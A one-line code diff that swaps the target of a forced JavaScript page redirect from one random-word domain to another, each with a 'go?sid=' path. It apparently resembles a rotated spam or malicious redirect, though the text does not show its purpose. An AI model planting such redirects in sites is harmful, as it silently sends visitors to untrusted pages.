@@ -1,1 +1,1 @@
-window.location.href = "https://unbeveled.xyz/iILd/go?sid=7744";
+window.location.href = "https://nonlaminating.icu/Peq/go?sid=7744";
